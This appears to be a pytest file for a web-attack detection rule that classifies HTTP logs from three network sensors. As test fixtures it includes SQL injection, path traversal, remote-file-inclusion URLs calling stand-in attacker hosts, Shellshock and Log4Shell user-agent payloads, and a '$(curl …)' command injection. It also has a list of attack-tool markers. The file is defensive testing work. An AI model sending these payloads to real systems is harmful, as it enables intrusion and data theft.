@pytest.mark.parametrize("sensor", ["zeek", "suricata", "arkime"])
@pytest.mark.parametrize("attack_class,uri,partial", HIDDEN_BY_DECODING)
def test_a_malformed_escape_or_byte_does_not_hide_the_request(sensor, attack_class, uri, partial):
    found, capped, reasons = classes_of([on_each_sensor(uri)[sensor]])
    assert attack_class in found
    assert capped == int(partial)
    assert not partial or any("utf8" in reason for reason in reasons)


@pytest.mark.parametrize("uri", ["/q?discount=100%", "/q?x=%ZZ", "/q?p=50%25+off", "/q?name=%C3%A9t%C3%A9",
                                 "/q?q=%u00e9t%u00e9", "/q?a=%", "/q?a=%4"])
def test_a_percent_that_starts_no_escape_is_a_literal(attack_rule, uri):
    assert finish(attack_rule, [event(uri)]) == []
    assert attack_rule.capped == 0 and attack_rule.evaluated == 1


@pytest.mark.parametrize("uri", ["/?x=%c0%af", "/?x=%E0%80%AF", "/a%c0%aeb", "/x?f=%c1%9c", "/?x=%f0%80%80%af",
                                 "/?x=%25c0%25af"])
def test_an_overlong_separator_or_dot_is_itself_traversal(attack_rule, uri):
    [match] = finish(attack_rule, [event(uri)])
    assert match.group_key.endswith("|path_traversal_lfi")
    assert attack_rule.capped == 0


@pytest.mark.parametrize("uri", ["/?x=%c1%81", "/?x=%c0%a7", "/?x=%c3%a9"])
def test_other_overlong_or_ordinary_two_byte_forms_are_not_traversal(attack_rule, uri):
    assert finish(attack_rule, [event(uri)]) == []


def test_an_oversize_uri_is_inspected_up_to_its_bound():
    found, capped, reasons = classes_of([event("/x?id=1'+or+'1'='1&pad=" + "a" * 17000)])
    assert found == {"sql_injection"} and capped == 1
    assert any("length" in reason for reason in reasons)
    # what lies beyond the bound is not read, and the record says so
    found, capped, reasons = classes_of([event("/x?pad=" + "a" * 17000 + "&id=1'+or+'1'='1")])
    assert found == set() and capped == 1


def test_an_oversize_uri_is_cited_truncated(attack_rule):
    [match] = finish(attack_rule, [event("/x?id=1'+or+'1'='1&pad=" + "a" * 17000)])
    [value] = [predicate.value for predicate in match.predicate if predicate.field == "url.original"]
    assert value.startswith("/x?id=1'+or+'1'='1&pad=") and value.endswith("[truncated]")
    assert len(value) <= wa.CITED_CHARS + len("[truncated]")


def test_every_value_of_a_long_arkime_list_is_inspected(attack_rule):
    uris = [f"www.example.test/page{n}" for n in range(300)]
    uris[200] = "www.example.test/x?id=1'+or+'1'='1"
    [match] = finish(attack_rule, [arkime(uris)])
    assert match.group_key.endswith("|sql_injection")
    assert attack_rule.capped == 0 and match.aggregate_summary["count_complete"] == 1
    # the citation holds the value that matched, not the three hundred that did not
    [cited] = [predicate.value for predicate in match.predicate if predicate.field == "url.path"]
    assert cited == ["www.example.test/x?id=1'+or+'1'='1"]


def test_the_total_text_bound_is_an_honest_partial(attack_rule):
    uris = ["/../../etc/passwd"] + [f"/{n:05d}/" + "a" * 120 for n in range(1024)] + ["/x?id=1'+or+'1'='1"]
    [match] = finish(attack_rule, [event(uris, producer="arkime")])
    assert match.group_key.endswith("|path_traversal_lfi")           # read before the bound
    assert match.aggregate_summary["record_count"] == 1
    assert attack_rule.capped == 1 and attack_rule.evaluated == 0
    assert any("text" in reason for reason in attack_rule.limit_reasons())
    assert match.aggregate_summary["count_complete"] == 0
    assert any("only partly inspected" in note for note in match.notes)


def test_a_list_of_repeats_costs_bounded_work(attack_rule):
    began = time.perf_counter()
    assert finish(attack_rule, [event(["/ordinary"] * 500_000, producer="arkime")]) == []
    assert time.perf_counter() - began < 5
    assert attack_rule.capped == 1                                   # the repeats beyond the bound were not read


# ---- remote-file inclusion -------------------------------------------------------------------------------------------

@pytest.mark.parametrize("uri", [
    "/fi/?page=http://evil.example/shell.txt", "/fi/?page=http%3A%2F%2Fevil.example%2Fshell.txt",
    "/fi/?page=http://evil.example/c99.txt?", "/fi/?page=http://evil.example/c99.jpg?",
    "/fi/?file=http://192.0.2.66/x", "/fi/?file=http://[2001:db8::66]/x", "/fi/?path=http://3232235777/x",
    "/index.php?inc=http://evil.example/shell", "/fi/?template=ftp://evil.example/a.inc",
    "/fi/?doc=http://evil.example/a.dat%00", "/fi/?document=https://evil.example/readme.txt&x=1",
    "/fi/?root=http://evil.example/cmd.tmp", "/fi/?page[]=http://evil.example/shell.txt",
    "/fi/?x=include('http://evil.example/a')",
])
def test_remote_inclusion_shapes_match(uri):
    assert classes_of(list(on_each_sensor(uri).values())[:1])[0] == {"remote_file_inclusion"}


@pytest.mark.parametrize("sensor", ["zeek", "suricata", "arkime"])
def test_canonical_remote_inclusion_matches_on_every_sensor(sensor):
    row = on_each_sensor("/dvwa/vulnerabilities/fi/?page=http://evil.example/shell.txt")[sensor]
    assert classes_of([row])[0] == {"remote_file_inclusion"}


@pytest.mark.parametrize("uri", [
    "/proxy?page=https://www.example.test/index.php", "/go?path=https://docs.example.test/guide.aspx",
    "/render?template=https://cdn.example.test/tpl/main.jsp", "/login?next=https://same.site/account/home",
    "/out?url=http://partner.example/landing.php?id=5", "/out?url=http://192.0.2.9/x.txt",
    "/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback.php",
    "/embed?file=https://cdn.example.test/video.mp4", "/viewer.html?file=https://docs.example.test/report.pdf",
    "/t?page=https%3A%2F%2Fwww.example.test%2Fpricing&ref=https%3A%2F%2Fwww.google.com%2F",
    "/thumb?path=https://cdn.example.test/a.jpg", "/doc?page=https://docs.example.test/txt",
    "/read?file=notes.txt", "/search?q=include+http://example.test/a.txt",
])
def test_ordinary_urls_in_parameters_are_not_remote_inclusion(uri):
    assert classes_of([zeek(uri)])[0] == set()


def test_a_url_on_the_requested_server_is_not_remote():
    # the fixtures' Host header is www.example.test and the server's address is the destination
    same_host = "/view?page=https://www.example.test/help/readme.txt"
    assert all(classes_of([row])[0] == set() for row in on_each_sensor(same_host).values())
    assert classes_of([event("/view?page=http://10.2.3.4/readme.txt?")])[0] == set()
    assert classes_of([event("/view?include=http://10.2.3.4/a.php")])[0] == set()
    # another host, or the same request with no recorded Host, is remote
    other = "/view?page=https://files.example.test/help/readme.txt"
    assert all(classes_of([row])[0] == {"remote_file_inclusion"} for row in on_each_sensor(other).values())
    assert classes_of([event(same_host)])[0] == {"remote_file_inclusion"}
    # and a same-site URL is still read by the local-file grammars
    assert classes_of([zeek("/view?page=https://www.example.test/../../etc/passwd")])[0] == {"path_traversal_lfi"}


SERVER = "10.9.0.1"      # one of the site's own servers under the default internal ranges


@pytest.mark.parametrize("uri", [
    "/fi/?page=http://evil.example/shell.php", "/fi/?page=http://evil.example/shell.php?cmd=id",
    "/fi/?page=//evil.example/shell.php", "/fi/?file=https://evil.example/a/b.jsp&x=1",
    "/fi/?template=http://evil.example/t.aspx", "/fi/?doc=http://evil.example/x.phtml",
    "/fi/?path=http://evil.example/run.cgi?a=b", "/fi/?page=http://evil.example/shell.php%00",
    "/fi/?page=http://evil.example/c99.gif?", "/fi/?root=http://evil.example/cmd.pl",
])
def test_a_script_url_on_another_domain_sent_to_the_sites_server_is_inclusion(uri):
    # the fixtures' Host is www.example.test
    assert classes_of([zeek(uri, destination=SERVER)])[0] == {"remote_file_inclusion"}
    # and with no recorded Host, or a Host that is an address
    assert classes_of([event(uri, destination=SERVER)])[0] == {"remote_file_inclusion"}
    assert classes_of([event(uri, destination=SERVER, extra={"http.hostname": "10.9.0.1"})])[0] == {
        "remote_file_inclusion"}


@pytest.mark.parametrize("uri", [
    # the same registered domain as the requested host
    "/proxy?page=https://www.example.test/index.php", "/go?path=https://docs.example.test/guide.aspx",
    "/render?template=https://cdn.example.test/tpl/main.jsp", "/go?path=//docs.example.test/guide.php",
    # not a URL, not a file-like parameter
    "/x?path=//static/app.php", "/x?page=/local/page.php", "/out?url=http://partner.example/landing.php?id=5",
    "/login?next=https://other.example/home.php", "/cb?redirect_uri=https://app.other.example/callback.php",
    # other domains with neither a script nor a text extension
    "/embed?file=https://media.example/video.mp4", "/view?page=https://other.example/guide",
])
def test_a_script_url_of_the_site_itself_or_in_a_redirect_is_not_inclusion(uri):
    assert classes_of([zeek(uri, destination=SERVER)])[0] == set()


@pytest.mark.parametrize("uri", [
    "/collect?page=https://shop.example.test/cart.php", "/b/ss?file=https://shop.example.test/item.aspx&v=1",
    "/pixel?doc=http://intranet.example.test/home.jsp",
])
def test_a_page_url_carried_outward_to_a_third_party_is_not_inclusion(uri):
    # an internal client reporting the page it is on to an outside collector: cross-domain, but outbound
    row = event(uri, source="10.2.3.9", destination="203.0.113.50", extra={"http.hostname": "stats.tracker.example"})
    assert classes_of([row])[0] == set()
    # the same request arriving at one of the site's servers is the inclusion shape
    inbound = event(uri, n=1, destination=SERVER, extra={"http.hostname": "stats.tracker.example"})
    assert classes_of([inbound])[0] == {"remote_file_inclusion"}


def test_a_two_label_suffix_is_not_mistaken_for_one_site():
    uri = "/fi/?page=http://evil.co.uk/shell.php"
    assert classes_of([event(uri, destination=SERVER, extra={"http.hostname": "www.victim.co.uk"})])[0] == {
        "remote_file_inclusion"}
    same = "/fi/?page=http://files.victim.co.uk/help.php"
    assert classes_of([event(same, n=1, destination=SERVER, extra={"http.hostname": "www.victim.co.uk"})])[0] == set()


# ---- fleet and sweep roll-ups ----------------------------------------------------------------------------------------

SQL, XSS, PATH = "/x?id=1'+or+'1'='1", "/s?q=<script>alert(1)</script>", "/../../etc/passwd"


def published(rule, rows, batch=256):
    live = []
    for offset in range(0, len(rows), batch):
        live.extend(rule.consume(rows[offset:offset + batch]))
    final = {match.group_key: match for match in rule.finalize()}
    return live, final


def test_one_scanner_against_many_servers_is_one_sweep_per_class(attack_rule):
    rows = [event(uri, n=3 * d + k, source="198.51.100.7", destination=f"10.9.{d // 250}.{d % 250 + 1}")
            for d in range(500) for k, uri in enumerate((PATH, XSS, SQL))]
    live, final = published(attack_rule, rows)
    assert len(final) == 3 * (wa.PAIR_LEADS + 1)
    assert all(match.proposed_lane == "lead" for match in [*live, *final.values()])
    sweeps = [match for key, match in final.items() if key.startswith("sweep|")]
    assert sorted(match.group_key for match in sweeps) == [
        f"sweep|198.51.100.7|{name}|in" for name in ("cross_site_scripting", "path_traversal_lfi", "sql_injection")]
    for match in sweeps:
        assert match.fleet_host_count == 500 and match.fleet_hosts_complete
        assert match.aggregate_summary["member_count"] == 500 and match.aggregate_summary["record_count"] == 500
        assert match.aggregate_summary["count_complete"] == 1
        members = [address for address, _event in match.fleet_hosts]
        assert len(members) == len(set(members)) == 500
        # internal servers are published as internal addresses: never as outside ones, never as host names
        assert match.fleet_member_kind == "internal_address"
        assert "500 distinct internal destination address(es)" in match.claim
        assert "and 490 more" in match.claim
        named = [value for kind, value, role in match.entities if role == "dst"]
        assert len(named) == wa.MEMBERS_NAMED and all(kind == "ip" for kind, _value, _role in match.entities)
        assert 1 <= len(match.events) <= 2 and match.predicate
    # the roll-up reached the analyst while the sweep was still running
    assert [match.group_key for match in live if match.group_key.startswith("sweep|")].count(
        "sweep|198.51.100.7|sql_injection|in") == 1


def test_many_sources_against_one_server_is_one_fleet_of_outside_addresses(attack_rule):
    rows = [event(SQL, n=s, source=f"198.51.{s // 250}.{s % 250 + 1}", destination="10.9.0.1") for s in range(400)]
    rows += [event(SQL, n=1000 + s, source="198.51.0.9", destination="10.9.0.1") for s in range(30)]
    live, final = published(attack_rule, rows)
    assert len(final) == wa.PAIR_LEADS + 1
    fleet = final["fleet|10.9.0.1|sql_injection|out"]
    assert fleet.proposed_lane == "lead"
    assert fleet.fleet_member_kind == "external_address"
    assert fleet.fleet_host_count == 400 and fleet.fleet_hosts_complete
    assert len({address for address, _event in fleet.fleet_hosts}) == 400
    assert fleet.aggregate_summary["record_count"] == 430
    assert "400 distinct outside source address(es) sent 430 recorded HTTP observation(s)" in fleet.claim
    assert "The sources with the most observations: 198.51.0.9 (31)" in fleet.claim
    assert ("ip", "10.9.0.1", "dst") in fleet.entities and ("ip", "198.51.0.9", "src") in fleet.entities
    assert not any(kind == "host" for kind, _value, _role in fleet.entities)
    assert any(match.group_key == fleet.group_key for match in live)


def test_every_pair_is_covered_when_many_scanners_meet_many_servers(attack_rule):
    pairs = [(f"198.51.{s // 250}.{s % 250 + 1}", f"10.9.0.{d + 1}") for s in range(300) for d in range(20)]
    rows = [event(SQL, n=n, source=source, destination=destination) for n, (source, destination) in enumerate(pairs)]
    _live, final = published(attack_rule, rows)
    fleets = [match for key, match in final.items() if key.startswith("fleet|")]
    sweeps = [match for key, match in final.items() if key.startswith("sweep|")]
    own = [key for key in final if not key.startswith(("fleet|", "sweep|"))]
    # one fleet per server; a sweep only for a scanner that reached a server before its fleet existed; the count
    # of findings follows the site's servers, not the scanners
    assert len(fleets) == 20 and all(match.fleet_host_count == 300 for match in fleets)
    assert len(sweeps) <= wa.PAIR_LEADS * 20 and len(own) <= wa.PAIR_LEADS * 20
    covered = {tuple(key.split("|")[:2]) for key in own}
    for match in fleets:
        covered |= {(address, match.group_key.split("|")[1]) for address, _event in match.fleet_hosts}
    for match in sweeps:
        covered |= {(match.group_key.split("|")[1], address) for address, _event in match.fleet_hosts}
    assert covered == set(pairs)
    assert all(match.fleet_member_kind == "external_address" for match in fleets)
    assert all(match.fleet_member_kind == "internal_address" for match in sweeps)


def test_an_internal_source_against_many_outside_servers_is_one_sweep_of_outside_addresses(attack_rule):
    rows = [event(PATH, n=d, source="10.2.3.9", destination=f"203.0.{d // 250}.{d % 250 + 1}") for d in range(300)]
    _live, final = published(attack_rule, rows)
    assert len(final) == wa.PAIR_LEADS + 1
    sweep = final["sweep|10.2.3.9|path_traversal_lfi|out"]
    assert sweep.fleet_member_kind == "external_address" and sweep.fleet_host_count == 300
    assert "to 300 distinct outside destination address(es)" in sweep.claim


def test_members_on_both_sides_of_the_site_boundary_are_two_roll_ups(attack_rule):
    rows = [event(SQL, n=s, source=f"198.51.100.{s + 1}", destination="10.9.0.1") for s in range(20)]
    rows += [event(SQL, n=100 + s, source=f"10.9.1.{s + 1}", destination="10.9.0.1") for s in range(20)]
    _live, final = published(attack_rule, rows)
    assert final["fleet|10.9.0.1|sql_injection|out"].fleet_member_kind == "external_address"
    assert final["fleet|10.9.0.1|sql_injection|in"].fleet_member_kind == "internal_address"
    assert {address for address, _event in final["fleet|10.9.0.1|sql_injection|in"].fleet_hosts} == {
        f"10.9.1.{s + 1}" for s in range(20)}
    assert len(final) == 2 * (wa.PAIR_LEADS + 1)


def test_findings_do_not_depend_on_the_order_records_arrive_in():
    import random

    def rows_in(order):
        return [event(SQL, n=n, at=n, source=source, destination=destination) for n, (source, destination) in order]

    pairs = [(f"198.51.100.{s + 1}", f"10.9.0.{d + 1}") for s in range(12) for d in range(12)]
    pairs += [("198.51.100.200", f"10.9.1.{d + 1}") for d in range(40)]            # one scanner, forty servers
    pairs += [(f"203.0.113.{s + 1}", "10.9.2.1") for s in range(60)]               # sixty sources, one server
    timed = list(enumerate(pairs))                                                 # a record's time never changes
    seen, lives = [], []
    for trial, batch in enumerate((256, 7, 64, 1000, 1)):
        order = list(timed)
        if trial:
            random.Random(trial).shuffle(order)
        if trial == 4:
            order.sort(reverse=True)                                               # newest first
        rule = rule_named("network.web_attacks")
        try:
            live, final = published(rule, rows_in(order), batch)
            # a secondary roll-up cites records kept once it had more members than keep their own leads
            seen.append({key: (match.claim, match.fleet_host_count, sorted(match.fleet_hosts),
                               [] if key.startswith("sweep|") else [item.id for item in match.events])
                         for key, match in final.items()})
            lives.append({match.group_key for match in live})
        finally:
            rule.close_spill()
    assert all(result == seen[0] for result in seen[1:])
    own = sorted(key for key in seen[0] if not key.startswith(("fleet|", "sweep|")))
    # the pairs with the earliest records keep the leads: the scanner's first five servers, the server's first five
    assert [key for key in own if key.startswith("198.51.100.200|")] == [
        f"198.51.100.200|10.9.1.{d + 1}|sql_injection" for d in range(wa.PAIR_LEADS)]
    assert [key for key in own if key.endswith("|10.9.2.1|sql_injection")] == [
        f"203.0.113.{s + 1}|10.9.2.1|sql_injection" for s in range(wa.PAIR_LEADS)]
    # records read in time order publish, as they arrive, exactly what stands at the end
    assert lives[0] == set(seen[0])
    # out of order, every final lead of a pair was still published on arrival unless its roll-up had reached the
    # bound on such leads, and no roll-up published more of them than that bound
    assert all(set(own) <= live for live in lives[:4])
    for live in lives:
        early = [key for key in live if not key.startswith(("fleet|", "sweep|"))]
        assert len([key for key in early if key.endswith("|10.9.2.1|sql_injection")]) <= wa.LIVE_PAIR_LEADS


def test_records_of_one_instant_are_ordered_by_address():
    rows = [event(SQL, n=s, at=0, source=f"198.51.100.{s + 1}", destination="10.9.0.1") for s in (9, 3, 7, 1, 5, 8, 2, 6, 4, 0)]
    for order in (rows, rows[::-1], sorted(rows, key=lambda row: row.id)):
        rule = rule_named("network.web_attacks")
        try:
            _live, final = published(rule, order, 3)
            own = sorted(key for key in final if not key.startswith("fleet|"))
            assert own == sorted(f"198.51.100.{s}|10.9.0.1|sql_injection" for s in (1, 10, 2, 3, 4))
        finally:
            rule.close_spill()


def test_roll_ups_do_not_depend_on_batch_boundaries():
    rows = [event(uri, n=2 * s + k, source=f"198.51.{s // 250}.{s % 250 + 1}", destination=f"10.9.0.{s % 7 + 1}")
            for s in range(180) for k, uri in enumerate((SQL, PATH))]
    seen = []
    for batch in (1, 7, 256, 4096):
        rule = rule_named("network.web_attacks")
        try:
            _live, final = published(rule, rows, batch)
            seen.append({key: (match.claim, match.fleet_host_count, sorted(match.fleet_hosts))
                         for key, match in final.items()})
        finally:
            rule.close_spill()
    assert seen[0] == seen[1] == seen[2] == seen[3]


def test_a_management_range_is_recognised_in_pairs_and_roll_ups(attack_rule):
    attack_rule.site_facts = SimpleNamespace(management_hosts=("198.51.100.0/24",))
    rows = [event(SQL, n=s, source=f"198.51.100.{s + 1}", destination="10.9.0.1") for s in range(12)]
    _live, final = published(attack_rule, rows)
    assert any("management" in note for note in final["198.51.100.1|10.9.0.1|sql_injection"].notes)
    fleet = final["fleet|10.9.0.1|sql_injection|out"]
    assert fleet.proposed_lane == "lead"
    assert any("12 of the source address(es) are site-declared management hosts" in note for note in fleet.notes)


def test_default_internal_ranges_are_named_as_an_assumption(attack_rule):
    rows = [event(SQL, n=s, source=f"198.51.100.{s + 1}", destination="10.9.0.1") for s in range(8)]
    _live, final = published(attack_rule, rows)
    assert any("internal networks not configured" in note
               for note in final["fleet|10.9.0.1|sql_injection|out"].notes)


# ---- credential masking ----------------------------------------------------------------------------------------------

CREDENTIAL_KEYS = [
    "password", "passwd", "pwd", "pass", "token", "access_token", "api_key", "auth", "Password", "PASSWORD",
    "p%61ssword", "user%5Bpassword%5D", "user[password]", "j_password", "user_password", "new_password", "password1",
    "pw", "passwort", "login_password", "txtPassword", "key", "code", "sig", "signature", "X-Amz-Signature",
    "X-Amz-Security-Token", "jwt", "session", "sessionid", "sid", "PHPSESSID", "JSESSIONID", "auth_token",
    "oauth_token", "csrf_token", "user_token", "apiKey", "apikey", "x-api-key", "client-secret", "private_key",
    "otp", "pin", "bearer", "credential", "secret_key", "id_token", "Authorization", "clientSecret", "privatekey",
    "pAsSwOrD", "PaSsWoRd", "pass_word", "pass-word", "passw", "userpass", "user_pass", "upass", "secretkey",
    "xapikey", "csrf", "_csrf", "xsrf", "csrfmiddlewaretoken", "cookie", "ticket", "SAMLResponse", "SAMLRequest",
    "assertion", "oauth_verifier", "__RequestVerificationToken", "ASP.NET_SessionId", "data[User][password]",
]


@pytest.mark.parametrize("key", CREDENTIAL_KEYS)
def test_a_parameter_with_a_credential_word_as_a_part_loses_its_value(attack_rule, key):
    [match] = finish(attack_rule, [event(f"/app/../../../etc/passwd?{key}=TOPSECRET&x=1")])
    assert "TOPSECRET" not in str(match)
    assert "TOPSECRET" not in stored_text(attack_rule)
    [value] = [predicate.value for predicate in match.predicate if predicate.field == "url.original"]
    assert value.startswith("/app/../../../etc/passwd?")              # the request itself stays readable


@pytest.mark.parametrize("key", ["monkey", "author", "passenger", "keyboard", "design", "assess", "tokenizer",
                                 "pinned", "decode", "sidebar", "compass", "bypass", "cookbook", "sticker", "samples",
                                 "passport", "user_id", "page"])
def test_a_credential_word_inside_another_word_is_not_a_credential(attack_rule, key):
    [match] = finish(attack_rule, [event(f"/app/../../../etc/passwd?{key}=VISIBLE&x=1")])
    assert any("VISIBLE" in str(predicate.value) for predicate in match.predicate)


def test_masking_one_parameter_keeps_the_attack_readable(attack_rule):
    [match] = finish(attack_rule, [event("/item?token=TOPSECRET&id=1'+union+select+1,2--+&sid=TOPSECRET")])
    [value] = [predicate.value for predicate in match.predicate if predicate.field == "url.original"]
    assert value == "/item?token=[redacted]&id=1'+union+select+1,2--+&sid=[redacted]"


@pytest.mark.parametrize("uri", [
    "/app;token=TOPSECRET/../../etc/passwd?x=1", "/app;token=TOPSECRET/../../etc/passwd",
    "/app;x=1;JSESSIONID=TOPSECRET/../../etc/passwd", "/app%3Btoken=TOPSECRET/../../etc/passwd",
    "/../../etc/passwd#access_token=TOPSECRET", "/../../etc/passwd?a=1;password=TOPSECRET",
    "/../../etc/passwd?password=abc;TOPSECRET", "/../../etc/passwd?u=http://admin:TOPSECRET@10.0.0.1/",
    "/../../etc/passwd?u=http%3A%2F%2Fadmin%3ATOPSECRET%4010.0.0.1%2F",
    "http://admin:TOPSECRET@www.example.test/../../etc/passwd",
    "/../../etc/passwd?%25&amp;&#x26;&p%61ss=TOPSECRET", "/../../etc/passwd?a=1#x=2&p%61ss=TOPSECRET",
    "/../../etc/passwd;x&password=TOPSECRET", "/../../etc/passwd/token=TOPSECRET/x", "/../../etc/passwd?x?sid=TOPSECRET",
])
def test_path_parameters_fragments_and_userinfo_are_masked_on_every_sensor(uri):
    for sensor, row in on_each_sensor(uri).items():
        rule = rule_named("network.web_attacks")
        try:
            matches = finish(rule, [row])
            assert matches, sensor
            assert "TOPSECRET" not in str(matches), sensor
            assert "TOPSECRET" not in stored_text(rule), sensor
        finally:
            rule.close_spill()


@pytest.mark.parametrize("query,kept", [
    ("pwd=a?TOPSECRET&x=1", "pwd=[redacted]&x=1"), ("pwd=a#TOPSECRET&x=1", "pwd=[redacted]&x=1"),
    ("pwd=a;TOPSECRET&x=1", "pwd=[redacted]&x=1"), ("x=1&token=a?b=TOPSECRET", "x=1&token=[redacted]"),
    ("a=1?password=TOPSECRET&x=1", "a=[redacted]&x=1"), ("a=1#access_token=TOPSECRET", "a=[redacted]"),
])
def test_a_credential_value_runs_to_the_end_of_its_parameter(attack_rule, query, kept):
    [match] = finish(attack_rule, [event("/app/../../../etc/passwd?" + query)])
    assert "TOPSECRET" not in str(match) and "TOPSECRET" not in stored_text(attack_rule)
    [value] = [predicate.value for predicate in match.predicate if predicate.field == "url.original"]
    assert value == "/app/../../../etc/passwd?" + kept


@pytest.mark.parametrize("target,kept", [
    # a credential in the path runs to the end of its segment
    ("/../../etc/passwd;sig=a;TOPSECRET;x", "/../../etc/passwd;sig=[redacted]"),
    ("/../../etc/passwd&token=a;TOPSECRET", "/../../etc/passwd&token=[redacted]"),
    # ... and through a `?` or `#` that is followed by text naming no parameter
    ("/../../etc/passwd;token=a?TOPSECRET", "/../../etc/passwd;token=[redacted]?[redacted]"),
    ("/../../etc/passwd;pwd=a#TOPSECRET?=&x=1", "/../../etc/passwd;pwd=[redacted]#[redacted]&x=1"),
    # a name that only appears once decoded: the target is withheld
    ("/../../etc/passwd;p&#97;ssword=TOPSECRET", "[redacted:encoded-credential-parameters]"),
    ("/../../etc/passwd%3Bpwd=a?TOPSECRET", "/../../etc/passwd%3Bpwd=[redacted]?[redacted]"),
    ("/../../etc/x%2Fgo%3Btoken%3DTOPSECRET", "[redacted:encoded-path-parameters]"),
    # a session path parameter does not cost the query its evidence
    ("/../../etc/passwd;jsessionid=TOPSECRET?id=1'+or+'1'='1&x=2",
     "/../../etc/passwd;jsessionid=[redacted]?id=1'+or+'1'='1&x=2"),
    ("/app;jsessionid=TOPSECRET/../../../etc/passwd?debug&id=1", "/app;jsessionid=[redacted]/../../../etc/passwd?debug&id=1"),
])
def test_a_credential_in_the_path_is_masked_to_where_its_value_can_end(attack_rule, target, kept):
    [match, *_others] = finish(attack_rule, [event(target)])
    assert "TOPSECRET" not in str(match) and "TOPSECRET" not in stored_text(attack_rule)
    [value] = [predicate.value for predicate in match.predicate if predicate.field == "url.original"]
    assert value == kept


def test_the_masking_note_states_what_is_masked(attack_rule):
    [match] = finish(attack_rule, [event("/../../etc/passwd")])
    [note] = [note for note in match.notes if "Request bodies are not inspected" in note]
    for word in ("query or path parameter", "password", "token", "key", "signature", "session", "auth",
                 "credential", "userinfo", "is retained"):
        assert word in note


# ---- tool markers and injections in the user agent -------------------------------------------------------------------

TOOL_AGENTS = [
    ("sqlmap/1.7.2#stable (https://sqlmap.org)", "sqlmap", "T1595.002"),
    ("Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)", "Nikto", "T1595.002"),
    ("Nuclei - Open-source project (github.com/projectdiscovery/nuclei)", "Nuclei", "T1595.002"),
    ("commix/v3.9-stable (https://commixproject.com)", "commix", "T1595.002"),
    ("Mozilla/5.0 (Hydra)", "Hydra", "T1110"),
    ("Teh Forest Lobster", "Medusa", "T1110"),
    ("Medusa v2.2", "Medusa", "T1110"),
    ("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "Nmap Scripting Engine",
     "T1595.002"),
    ("gobuster/3.6", "gobuster", "T1595.003"),
    ("DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)", "DirBuster", "T1595.003"),
    ("dirb/2.22", "dirb", "T1595.003"),
    ("Wfuzz/2.4", "Wfuzz", "T1595.003"),
    ("Fuzz Faster U Fool v2.1.0", "ffuf", "T1595.003"),
    ("feroxbuster/2.10.1", "feroxbuster", "T1595.003"),
    ("WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)", "WPScan", "T1595.002"),
    ("WhatWeb/0.5.5", "WhatWeb", "T1595.002"),
    ("Recon-ng/v5", "Recon-ng", "T1595.002"),
    ("masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "masscan", "T1595.001"),
    ("Mozilla/5.0 zgrab/0.x", "zgrab", "T1595.001"),
    ("Mozilla/5.0 (compatible; Nessus SOAP)", "Nessus", "T1595.002"),
    ("Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)", "OpenVAS", "T1595.002"),
    ("Acunetix-Aspect", "Acunetix", "T1595.002"),
    ("w3af.org", "w3af", "T1595.002"),
    ("Arachni/v1.5.1", "Arachni", "T1595.002"),
    ("ZAP/2.14", "ZAP", "T1595.002"),
]


@pytest.mark.parametrize("agent,name,technique", TOOL_AGENTS)
def test_tool_markers_name_the_tool_and_its_technique(attack_rule, agent, name, technique):
    [match] = finish(attack_rule, [event(agent=agent, status=200)])
    assert match.group_key.endswith("|exploit_tool") and match.proposed_lane == "lead"
    assert f"Markers: {name}." in match.claim
    assert match.attack == (technique,)
    assert "T1190" not in match.attack


@pytest.mark.parametrize("sensor", ["zeek", "suricata", "arkime"])
def test_a_tool_marker_is_read_on_every_sensor(sensor):
    row = {"zeek": zeek("/", agent="Mozilla/5.0 (Hydra)"), "suricata": suricata("/", agent="Mozilla/5.0 (Hydra)"),
           "arkime": arkime(["www.example.test/"], agents=["Mozilla/5.0 (Hydra)"])}[sensor]
    assert classes_of([row])[0] == {"exploit_tool"}


@pytest.mark.parametrize("agent", [
    "python-requests/2.31.0", "curl/8.4.0", "Go-http-client/1.1", "Wget/1.21", "okhttp/4.12.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; php)", "MyApp/1.0 (linux; node 18.2.0)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "hydrant-client/2.0", "nmap-docs-fetcher/1.0", "Zapier", "medusajs-client/1.2", "nessusd-mirror", "dirbs/1",
    "my-sqlmap-notes", "wpscanner-report", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
])
def test_ordinary_and_lookalike_user_agents_do_not_match(attack_rule, agent):
    assert finish(attack_rule, [event(agent=agent)]) == []
    assert attack_rule.capped == 0


@pytest.mark.parametrize("uri", ["/search?q=sqlmap+tutorial", "/downloads/nikto/nikto-2.5.tar.gz", "/blog/hydra",
                                 "/pkg?list=nmap,gobuster,wfuzz", "/wiki/Nuclei_(scanner)"])
def test_a_tool_name_in_a_request_target_is_a_mention_not_a_marker(attack_rule, uri):
    assert finish(attack_rule, [event(uri)]) == []


@pytest.mark.parametrize("agent,attack_class", [
    ("() { :; }; /bin/bash -c 'cat /etc/passwd'", "command_injection"),
    ("() { ignored; }; echo; /usr/bin/id", "command_injection"),
    ("Mozilla/5.0 $(curl http://192.0.2.9/x)", "command_injection"),
    ("${jndi:ldap://192.0.2.66:1389/a}", "template_injection"),
    ("${${lower:j}ndi:ldap://192.0.2.66/a}", "template_injection"),
    ("Mozilla/5.0' AND SLEEP(5)-- ", "sql_injection"),
    ("<script>alert(1)</script>", "cross_site_scripting"),
])
def test_injection_grammars_read_the_user_agent(attack_rule, agent, attack_class):
    [match] = finish(attack_rule, [event(agent=agent)])
    assert match.group_key.endswith("|" + attack_class)
    assert match.attack == ("T1190",)


def test_every_technique_is_in_the_vendored_attack_bundle():
    with gzip.open(ROOT / "content" / "attack" / "enterprise-attack-20.0.json.gz") as handle:
        bundle = json.load(handle)
    current = {reference["external_id"] for item in bundle["objects"] if item.get("type") == "attack-pattern"
               and not item.get("revoked") and not item.get("x_mitre_deprecated")
               for reference in item.get("external_references", []) if reference.get("source_name") == "mitre-attack"}
